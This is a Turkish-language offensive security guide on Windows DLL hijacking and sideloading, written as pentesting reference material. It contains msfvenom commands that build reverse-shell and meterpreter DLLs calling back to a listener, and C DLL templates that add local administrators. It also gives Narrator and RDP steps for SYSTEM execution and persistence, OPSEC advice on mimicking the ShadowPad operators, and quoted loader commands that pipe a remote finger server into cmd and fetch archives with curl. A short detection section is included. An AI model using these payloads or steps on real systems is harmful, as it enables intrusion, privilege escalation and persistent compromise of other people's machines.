Bu ön koşullar varsayılan olarak nadiren karşılanır: Yetkili yürütülebilir dosyaların genellikle eksik DLL bağımlılıkları olmaz ve standart kullanıcılar normalde sistem arama yolu dizinlerine yazamaz. Ancak yanlış yapılandırılmış ortamlar her iki koşulu da ortaya çıkarabilir.\
Gereksinimler karşılanıyorsa [UACME](https://github.com/hfiref0x/UACME) projesine bakın. Temel amacı UAC bypass olsa da, belirli Windows sürümleri için çoğu zaman bulduğunuz yazılabilir dizine uyarlanabilen DLL-hijacking PoC'leri içerir.

Bir klasördeki izinlerinizi şu şekilde **kontrol edebilirsiniz**:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Ve **PATH içindeki tüm klasörlerin izinlerini kontrol edin**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Bir executable'ın importlarını ve bir DLL'in exportlarını şu şekilde de kontrol edebilirsiniz:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

DLL Hijacking'i **System Path klasörüne yazma izinleriyle** ayrıcalıkları yükseltmek için **kötüye kullanma** konusunda kapsamlı bir kılavuz için şuraya bakın:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Otomatik araçlar

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS), System PATH içindeki herhangi bir klasörde yazma izniniz olup olmadığını kontrol eder.\
Bu güvenlik açığını keşfetmek için kullanılabilecek diğer ilgi çekici otomatik araçlar, **PowerSploit işlevleri** olan _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll_'dır.

### Örnek

Kötüye kullanılabilir bir senaryo bulursanız, başarılı bir şekilde istismar etmek için en önemli şeylerden biri, **çalıştırılabilir dosyanın içe aktaracağı tüm işlevleri dışa aktaran bir dll oluşturmaktır**. Her hâlükârda, DLL Hijacking'in [Medium Integrity seviyesinden High seviyesine **(UAC'yi atlayarak)**](../../authentication-credentials-uac-and-efs/index.html#uac) veya [**High Integrity seviyesinden SYSTEM'e**](../index.html#from-high-integrity-to-system)**.** yükseltme için kullanışlı olduğunu unutmayın. **Geçerli bir dll oluşturma** örneğini, çalıştırma için DLL hijacking'e odaklanan şu DLL hijacking çalışmasında bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ayrıca, **sonraki bölüm**de **şablon olarak** kullanabileceğiniz veya **zorunlu olmayan işlevleri dışa aktaran bir dll** oluşturmak için yararlanabileceğiniz bazı **temel dll kodları** bulabilirsiniz.

## **DLL'leri oluşturma ve derleme**

### **DLL Proxifying**

Temel olarak bir **DLL proxy**, **yüklendiğinde kötü amaçlı kodunuzu çalıştırabilen**, aynı zamanda **gerçek kitaplığa yapılan tüm çağrıları ileterek** onun gibi **davranan ve çalışabilen** bir DLL'dir.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) aracıyla, **bir çalıştırılabilir dosya belirtip proxify etmek istediğiniz kitaplığı seçerek proxified bir dll oluşturabilir** veya **DLL'yi belirtip proxified bir dll oluşturabilirsiniz**.

### **Meterpreter**

**Rev shell al (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Bir meterpreter (x86) edinin:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Bir kullanıcı oluştur (x86, x64 sürümünü görmedim):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Kendiniz

Birçok durumda derlediğiniz DLL, **victim process tarafından içe aktarılan tüm işlevleri export etmelidir**. Gerekli bir export eksikse ikili dosya bu işlevi çözümleyemez ve exploit başarısız olur.

<details>
<summary>C DLL template (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Kullanıcı oluşturma içeren C++ DLL örneği</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Thread entry içeren alternatif C DLL</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### Export ile tetiklenen başlatma kullanan NativeAOT DLL

Kendi içinde çalışan bir **.NET NativeAOT paylaşımlı kitaplığı**, açıkça `DllMain` uygulamadan yerleştirilen yerel DLL olarak kullanılabilir. `[UnmanagedCallersOnly(EntryPoint = "...")]` ile statik C# yöntemlerini dışa aktarın; yerel host, derleyicinin oluşturduğu bu giriş noktalarından birini çağırdığında NativeAOT modülü başlatır ve dışa aktarılan C# gövdesinden önce bir `[ModuleInitializer]` yöntemi çalışır. Çıktı, ayrıca yüklenmiş bir .NET runtime gerektirmez.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

DLL'nin yine de seçilen host'un gerçekten çağırdığı **dışa aktarma adlarına ve ABI uyumlu imzalara** sahip olması gerekir. Başlatmayı tetiklemek için minimal stub'lar yeterli olabilir; ancak eksik dışa aktarmalar yüklemeyi engelleyebilir, hatalı imza ise çağrıyı bozabilir. Host'un import'larını listeleyin ve çıktıyı host'un beklediği bağımlılık adıyla yeniden adlandırmadan önce `dumpbin /exports payload.dll` ile doğrulayın.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>Minimal NativeAOT dışa aktarılan DLL</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

Projeyi kendi kendine yeterli bir Windows native shared library olarak yapılandırın:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Yeniden adlandırılmış DLL'yi kopyalanmış, güvenlik açığı bulunan yürütülebilir dosyanın yanına yerleştirin ve ana makineyi uyumlu export'u çağıran kod yolu üzerinden başlatın. Bu başlatıcı yaklaşım, karmaşık işlemleri doğrudan `DllMain` içine yerleştirmekten kaçınır; ancak sideload önkoşulları değişmez: loader bağımlılığı ada göre çözümlemeli, uygulama dizinini seçmeli ve bağımlılığı önce KnownDLLs, zaten yüklenmiş bir modül, SxS yönlendirmesi veya kısıtlı `LOAD_LIBRARY_SEARCH_*` bayrakları üzerinden karşılamamalıdır.<sup>[[26]](#references)[[30]](#references)</sup>

Geleneksel native şablonlar için bkz. [Windows C payloads](../windows-c-payloads.md). Sideload edilen bir first stage daha sonra [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe) gerçekleştirebilir; ancak bu, DLL çözümlemesinin bir parçası değil, ayrı bir injection tekniğidir.

## Tespit: DLL masquerading library loads

Elastic Defend 9.5.0, yüklenen dosya Microsoft imzalı değilse ve dosya adı Elastic'in Windows/sistem DLL adlarından oluşan önbelleğe alınmış envanterindeki bir adla çakışıyorsa, library-load event'ini `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"` ile zenginleştirir. Böylece dosya adı envanteri, sistem konumu ve imza analizi endpoint sensor'üne taşınır; bu nedenle temel EQL şu şekilde sadeleştirilebilir:<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Zenginleştirmeyi tek başına kanıt olarak değil, yüksek değerli bir pivot olarak değerlendirin. İmzalı bir host DLL'yi kendi **kullanıcı tarafından yazılabilir** dizininden yüklediğinde, DLL imzasız/güvenilmeyen olduğunda ve `dll.Ext.relative_file_creation_time` DLL'nin yüklenmeden kısa süre önce oluşturulduğunu gösterdiğinde güven düzeyini artırın. Hariç tutmaları tam yayıncı + host process + kurulum yolu ile sınırlandırın; çakışan bir DLL adını genel olarak yok saymayın, çünkü meşru yükleyiciler ve uygulamalar sistemdekilere benzeyen adlara sahip özel kitaplıklar içerebilir.<sup>[[26]](#references)</sup>

Bu zenginleştirmenin olmadığı sensörlerde, çakışan bir DLL adını sistem dışı yükleme yolu, Microsoft imzasının olmaması/güvenilmez olması ve dosyanın oluşturulması ile yüklenmesi arasındaki kısa süreyle ilişkilendirerek davranışı yaklaşık olarak belirleyin. Bunun için güncel tutulan bir DLL adı envanteri ve `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS` ile onaylanmış diğer dağıtım yolları için dar kapsamlı hariç tutmalar gerekir.<sup>[[26]](#references)</sup>

## Vaka İncelemesi: Narrator OneCore TTS Yerelleştirme DLL Hijack (Erişilebilirlik/AT'ler)

Windows Narrator.exe, başlangıçta tahmin edilebilir, dile özgü bir yerelleştirme DLL'sini hâlâ araştırıyor; bu DLL, keyfi kod yürütme ve kalıcılık için ele geçirilebilir.<sup>[[7]](#references)</sup>

Temel bilgiler
- Araştırma yolu (güncel sürümler): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Eski yol (daha eski sürümler): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore yolunda saldırganın denetimindeki yazılabilir bir DLL varsa yüklenir ve `DllMain(DLL_PROCESS_ATTACH)` yürütülür. Dışa aktarılan işlev gerekmez.

Procmon ile keşif
- Filtre: `Process Name is Narrator.exe` ve `Operation is Load Image` veya `CreateFile`.
- Narrator'ı başlatın ve yukarıdaki yola yönelik yükleme girişimini gözlemleyin.

En küçük DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC sessizliği
- Naif bir hijack, UI'da ses çıkarır/vurgu yapar. Sessiz kalmak için attach sırasında Narrator thread'lerini listeleyin, ana thread'i açın (`OpenThread(THREAD_SUSPEND_RESUME)`) ve askıya alın (`SuspendThread`); kendi thread'inizde devam edin. Tam kod için PoC'ye bakın.<sup>[[8]](#references)</sup>

Accessibility yapılandırmasıyla tetikleme ve kalıcılık
- Kullanıcı bağlamı (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Yukarıdakilerle Narrator başlatıldığında yerleştirilen DLL yüklenir. Güvenli masaüstünde (oturum açma ekranında), Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'iniz güvenli masaüstünde SYSTEM olarak çalışır.

RDP ile tetiklenen SYSTEM yürütmesi (yatay hareket)
- Klasik RDP güvenlik katmanını etkinleştirin: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Ana bilgisayara RDP ile bağlanın ve oturum açma ekranında Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'iniz güvenli masaüstünde SYSTEM olarak çalışır.
- Yürütme, RDP oturumu kapandığında durur; hemen inject/migrate edin.

Kendi Accessibility aracınızı getirin (BYOA)
- Yerleşik bir Accessibility Tool (AT) kayıt defteri girdisini (ör. CursorIndicator) kopyalayabilir, rastgele bir binary/DLL'i işaret edecek şekilde düzenleyip içe aktarabilir ve ardından `configuration` değerini bu AT'nin adına ayarlayabilirsiniz. Bu, Accessibility framework'ü altında rastgele yürütme sağlar.

Notlar
- `%windir%\System32` dizinine yazmak ve HKLM değerlerini değiştirmek için yönetici hakları gerekir.
- Tüm payload mantığı `DLL_PROCESS_ATTACH` içinde bulunabilir; dışa aktarma gerekmez.

## Örnek Olay: CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Yetki Yükseltme

Bu örnekte, Lenovo'nun TrackPoint Quick Menu'sündeki (`TPQMAssistant.exe`) **Phantom DLL Hijacking** ele alınmaktadır; bu açık **CVE-2025-1729** olarak izlenmektedir.<sup>[[2]](#references)[[3]](#references)</sup>

### Güvenlik Açığı Ayrıntıları

- **Bileşen**: `C:\ProgramData\Lenovo\TPQM\Assistant\` konumundaki `TPQMAssistant.exe`.
- **Zamanlanmış Görev**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask`, her gün saat 9:30'da oturum açmış kullanıcının bağlamında çalışır.
- **Dizin İzinleri**: `CREATOR OWNER` tarafından yazılabilir; bu da yerel kullanıcıların rastgele dosyalar bırakmasına olanak tanır.
- **DLL Arama Davranışı**: Önce çalışma dizininden `hostfxr.dll` yüklemeye çalışır ve dosya bulunamadığında "NAME NOT FOUND" kaydı oluşturur; bu da yerel dizin aramasına öncelik verildiğini gösterir.

### Exploit Uygulaması

Bir saldırgan, eksik DLL'den yararlanarak kullanıcının bağlamında kod yürütmek için aynı dizine kötü amaçlı bir `hostfxr.dll` stub'ı yerleştirebilir:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Saldırı Akışı

1. Standart kullanıcı olarak `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` dizinine bırakın.
2. Zamanlanmış görevin, geçerli kullanıcının bağlamında sabah 9:30'da çalışmasını bekleyin.
3. Görev çalıştığında bir yönetici oturum açmışsa, kötü amaçlı DLL yöneticinin oturumunda orta bütünlük düzeyinde çalışır.
4. Orta bütünlük düzeyinden SYSTEM ayrıcalıklarına yükselmek için standart UAC bypass tekniklerini zincirleyin.

## Vaka İncelemesi: MSI CustomAction Dropper + İmzalı Host Üzerinden DLL Side-Loading (wsc_proxy.exe)

Tehdit aktörleri, payload'ları güvenilir ve imzalı bir süreç altında çalıştırmak için MSI tabanlı dropper'ları sık sık DLL side-loading ile birlikte kullanır.<sup>[[10]](#references)</sup>

Zincire genel bakış
- Kullanıcı MSI dosyasını indirir. GUI kurulumu sırasında bir CustomAction sessizce çalışır (ör. LaunchApplication veya bir VBScript eylemi) ve gömülü kaynaklardan sonraki aşamayı yeniden oluşturur.
- Dropper, meşru ve imzalı bir EXE ile kötü amaçlı bir DLL'yi aynı dizine yazar (örnek çift: Avast imzalı wsc_proxy.exe + saldırganın kontrolündeki wsc.dll).
- İmzalı EXE başlatıldığında, Windows DLL arama sırası önce çalışma dizinindeki wsc.dll dosyasını yükler ve saldırganın kodunu imzalı bir üst süreç altında çalıştırır (ATT&CK T1574.001).

MSI analizi (nelere bakılmalı)
- CustomAction tablosu:
  - Çalıştırılabilir dosyaları veya VBScript'i çalıştıran girdileri arayın. Şüpheli bir örüntü: arka planda gömülü bir dosyayı çalıştıran LaunchApplication.
  - Orca'da (Microsoft Orca.exe) CustomAction, InstallExecuteSequence ve Binary tablolarını inceleyin.
- MSI CAB içindeki gömülü/bölünmüş payload'lar:
  - Yönetimsel çıkarma: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Ya da lessmsi kullanın: lessmsi x package.msi C:\out
  - VBScript CustomAction tarafından birleştirilip şifresi çözülen birden çok küçük parçayı arayın. Yaygın akış:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Practical sideloading with wsc_proxy.exe
- Bu iki dosyayı aynı klasöre bırakın:
  - wsc_proxy.exe: Meşru, imzalı host (Avast). İşlem, bulunduğu dizinde ada göre wsc.dll dosyasını yüklemeye çalışır.
  - wsc.dll: Saldırgan DLL'i. Belirli export'lar gerekmiyorsa DllMain yeterli olabilir; aksi takdirde bir proxy DLL oluşturup gerekli export'ları gerçek kütüphaneye yönlendirirken DllMain içinde payload çalıştırın.
- Minimal bir DLL payload oluşturun:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Export gereksinimleri için, payload'unuzu da çalıştıran bir forwarding DLL oluşturmak üzere proxying framework (ör. DLLirant/Spartacus) kullanın.

- Bu teknik, DLL adının host binary tarafından çözümlenmesine dayanır. Host mutlak yollar veya güvenli yükleme bayrakları (ör. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) kullanıyorsa hijack başarısız olabilir.
- KnownDLLs, SxS ve forwarded export'lar önceliği etkileyebilir; host binary'yi ve export kümesini seçerken bunları göz önünde bulundurun.

## İmzalı üçlüler + şifrelenmiş payload'lar (ShadowPad vaka çalışması)

Check Point, Ink Dragon'ın ShadowPad'i, meşru yazılımlarla kamufle olurken temel payload'u diskte şifreli tutmak için **üç dosyalı bir üçlü** kullanarak dağıttığını açıkladı:<sup>[[12]](#references)</sup>

1. **İmzalı host EXE** – AMD, Realtek veya NVIDIA gibi üreticiler suistimal edilir (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Saldırganlar yürütülebilir dosyayı bir Windows binary'sine benzeyecek şekilde yeniden adlandırır (örneğin `conhost.exe`), ancak Authenticode imzası geçerliliğini korur.
2. **Kötü amaçlı loader DLL** – beklenen adla (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`) EXE'nin yanına bırakılır. DLL genellikle ScatterBrain framework'üyle gizlenmiş bir MFC binary'sidir; tek görevi şifrelenmiş blob'u bulmak, şifresini çözmek ve ShadowPad'i reflectively map etmektir.
3. **Şifrelenmiş payload blob'u** – genellikle aynı dizinde `<name>.tmp` olarak saklanır. Şifresi çözülmüş payload'u belleğe map ettikten sonra loader, adli inceleme kanıtlarını yok etmek için TMP dosyasını siler.

Operasyon notları:

* İmzalı EXE'yi yeniden adlandırmak (PE header'daki özgün `OriginalFileName` değerini korurken), üretici imzasını muhafaza ederek Windows binary'si gibi görünmesini sağlar. Bu nedenle Ink Dragon'ın `conhost.exe` görünümündeki, aslında AMD/NVIDIA yardımcı programları olan binary'leri bırakma alışkanlığını taklit edin.
* Yürütülebilir dosya güvenilir kaldığından, allowlisting kontrollerinin çoğunda yalnızca kötü amaçlı DLL'nizin yanına yerleştirilmesi gerekir. Loader DLL'yi özelleştirmeye odaklanın; imzalı parent genellikle değiştirilmeden çalıştırılabilir.
* ShadowPad'in decryptor'ı, TMP blob'unun loader'ın yanında bulunmasını ve eşleme sonrasında dosyayı sıfırlayabilmek için yazılabilir olmasını bekler. Payload yüklenene kadar dizini yazılabilir tutun; belleğe alındıktan sonra OPSEC için TMP dosyası güvenle silinebilir.

### LOLBAS stager + aşamalı arşiv sideloading zinciri (finger → tar/curl → WMI)

Operatörler, diskteki tek özel artifact'in güvenilir EXE'nin yanındaki kötü amaçlı DLL olması için DLL sideloading'i LOLBAS ile birleştirir:<sup>[[1]](#references)</sup>

- **Uzaktan komut loader'ı (Finger):** Gizli PowerShell, `cmd.exe /c` başlatır, Finger sunucusundan komutları alır ve `cmd`'ye pipe eder:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` TCP/79 üzerinden metin çeker; `| cmd` sunucu yanıtını çalıştırarak operatörlerin ikinci aşamayı sunucu tarafında değiştirmesine olanak tanır.

- **Yerleşik indirme/çıkarma:** Zararsız bir uzantıya sahip bir arşiv indirin, arşivi açın ve sideload hedefini ve DLL'yi rastgele bir `%LocalAppData%` klasörüne yerleştirin:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` ilerleme durumunu gizler ve yönlendirmeleri izler; `tar -xf`, Windows'un yerleşik tar aracını kullanır.

- **WMI/CIM ile başlatma:** EXE'yi WMI üzerinden başlatın; böylece yan yana bulunan DLL'yi yüklerken telemetride CIM tarafından oluşturulmuş bir işlem görünür:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Yerel DLL'leri tercih eden binary'lerle çalışır (ör. `intelbq.exe`, `nearby_share.exe`); payload (ör. Remcos), güvenilir ad altında çalışır.

- **Avlama:** `/p`, `/m` ve `/c` seçenekleri birlikte göründüğünde `forfiles` için uyarı oluşturun; yönetici betikleri dışında bu kullanım yaygın değildir.


## Vaka Çalışması: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Yakın tarihli bir Lotus Blossom saldırısı, NSIS ile paketlenmiş bir dropper'ın DLL sideload ve tamamen bellek içi payload'lar hazırlamasını sağlamak için güvenilir bir güncelleme zincirini kötüye kullandı.<sup>[[13]](#references)</sup>

TTP akışı
- `update.exe` (NSIS), `%AppData%\Bluetooth` dizinini oluşturur, **HIDDEN** olarak işaretler, yeniden adlandırılmış bir Bitdefender Submission Wizard `BluetoothService.exe`, kötü amaçlı bir `log.dll` ve şifrelenmiş bir `BluetoothService` blob'u bırakır, ardından EXE'yi başlatır.
- Ana host EXE, `log.dll` dosyasını import eder ve `LogInit`/`LogWrite` işlevlerini çağırır. `LogInit` blob'u mmap ile yükler; `LogWrite` özel bir LCG tabanlı akışla (sabitler **0x19660D** / **0x3C6EF35F**, anahtar materyali önceki bir hash'ten türetilir) şifresini çözer, buffer'ı düz metin shellcode ile üzerine yazar, geçici verileri serbest bırakır ve shellcode'a atlar.
- IAT kullanmamak için loader, export adlarını **FNV-1a basis 0x811C9DC5 + prime 0x1000193** kullanarak hash'ler, ardından Murmur tarzı bir avalanche (**0x85EBCA6B**) uygular ve sonuçları salt eklenmiş hedef hash'lerle karşılaştırır.

Ana shellcode (Chrysalis)
- PE benzeri ana modülün şifresini, `gQ2JR&9;` anahtarıyla beş geçiş boyunca add/XOR/sub işlemlerini tekrarlayarak çözer, ardından import çözümlemesini tamamlamak için `Kernel32.dll` → `GetProcAddress` dinamik olarak yükler.
- DLL ad dizelerini çalışma zamanında karakter başına bit-rotate/XOR dönüşümleriyle yeniden oluşturur, ardından `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` yükler.
- İkinci bir resolver, **PEB → InMemoryOrderModuleList** üzerinde gezinir, her export tablosunu 4 baytlık bloklar halinde Murmur tarzı karıştırmayla ayrıştırır ve yalnızca hash bulunamazsa `GetProcAddress`'e geri döner.

Gömülü yapılandırma ve C2
- Yapılandırma, bırakılan `BluetoothService` dosyasının içinde **0x30808** offset'inde (**0x980** boyutunda) bulunur ve C2 URL'sini ve User-Agent'ı ortaya çıkarmak için `qwhvb^435h&*7` anahtarıyla RC4 kullanılarak şifresi çözülür.
- Beacon'lar noktayla ayrılmış bir host profili oluşturur, başına `4Q` etiketi ekler, ardından HTTPS üzerinden `HttpSendRequestA` çağrısı yapmadan önce `vAuig34%^325hGV` anahtarıyla RC4 kullanarak şifreler. Yanıtların RC4 şifresi çözülür ve bir tag switch ile işleme alınır (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Çalıştırma modu CLI argümanlarına bağlıdır: argüman yoksa `-i`'yi işaret eden kalıcılık (service/Run key) yüklenir; `-i` kendisini `-k` ile yeniden başlatır; `-k` kurulumu atlar ve payload'ı çalıştırır.

Gözlemlenen alternatif loader
- Aynı saldırı Tiny C Compiler'ı bıraktı ve `C:\ProgramData\USOShared\` konumunda, yanında `libtcc.dll` ile birlikte `svchost.exe -nostdlib -run conf.c` komutunu çalıştırdı. Saldırganın sağladığı C kaynak kodu shellcode içeriyordu; derlenip PE dosyası diske yazılmadan bellek içinde çalıştırıldı. Şu şekilde tekrarlayabilirsiniz:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Bu TCC tabanlı derleme ve çalıştırma aşaması, `Wininet.dll` dosyasını çalışma zamanında içe aktarıyor ve sabit kodlanmış bir URL'den ikinci aşama shellcode'unu çekiyordu; böylece derleyici çalıştırması gibi görünen esnek bir loader sağlıyordu.

## Signed-host sideloading with export proxying + host thread parking

Bazı DLL sideloading zincirleri, kötü amaçlı DLL yüklendikten sonra çökmesini önleyip sonraki aşamaların sorunsuz yüklenmesine yetecek süre boyunca meşru ana makineyi çalışır durumda tutmak için **stability engineering** uygular.<sup>[[11]](#references)</sup>

Gözlemlenen örüntü
- Beklenen bağımlılık adıyla (örneğin `version.dll`) kötü amaçlı bir DLL'yi güvenilir bir EXE'nin yanına bırakın.
- Kötü amaçlı DLL, içe aktarma çözümlemesinin başarılı olması ve ana makine işleminin çalışmaya devam etmesi için beklenen tüm export'ları gerçek sistem DLL'sine (örneğin `%SystemRoot%\\System32\\version.dll`) **proxy'ler**.
- Yüklendikten sonra kötü amaçlı DLL, ana iş parçacığının çıkmak veya işlemi sonlandıracak kod yollarını çalıştırmak yerine sonsuz bir `Sleep` döngüsüne girmesi için ana makinenin giriş noktasına **yama uygular**.
- Gerçek kötü amaçlı işi yeni bir iş parçacığı yapar: sonraki aşama DLL'sinin adını veya yolunu çözer (RC4/XOR yaygındır), ardından `LoadLibrary` ile başlatır.

Bunun önemi
- Normal DLL proxy'leme, API uyumluluğunu korur ancak ana makinenin sonraki aşamalar için yeterince uzun süre çalışır durumda kalmasını garanti etmez.
- Ana iş parçacığını `Sleep(INFINITE)` içinde bekletmek, loader başka bir iş parçacığında şifre çözme, hazırlık veya ağ başlangıç işlemlerini yürütürken imzalı işlemi bellekte tutmanın basit bir yoludur.
- Yalnızca şüpheli bir `DllMain` aramak, ilginç davranış ana makinenin giriş noktasına yama uygulandıktan ve ikincil bir iş parçacığı başlatıldıktan sonra gerçekleşiyorsa bu örüntünün gözden kaçmasına yol açabilir.

Asgari iş akışı
1. İmzalı ana makine EXE'sini kopyalayın ve yerel dizinden hangi DLL'yi çözdüğünü belirleyin.
2. Aynı işlevleri export eden ve bunları meşru DLL'ye yönlendiren bir proxy DLL oluşturun.
3. `DllMain(DLL_PROCESS_ATTACH)` içinde bir worker thread oluşturun.
4. Bu iş parçacığından, `Sleep` döngüsüne girmesi için ana makinenin giriş noktasına veya ana iş parçacığı başlangıç rutinine yama uygulayın.
5. Sonraki aşama DLL'sinin adını/yapılandırmasını çözün ve `LoadLibrary` çağırın ya da payload'ı manual-map yöntemiyle yükleyin.

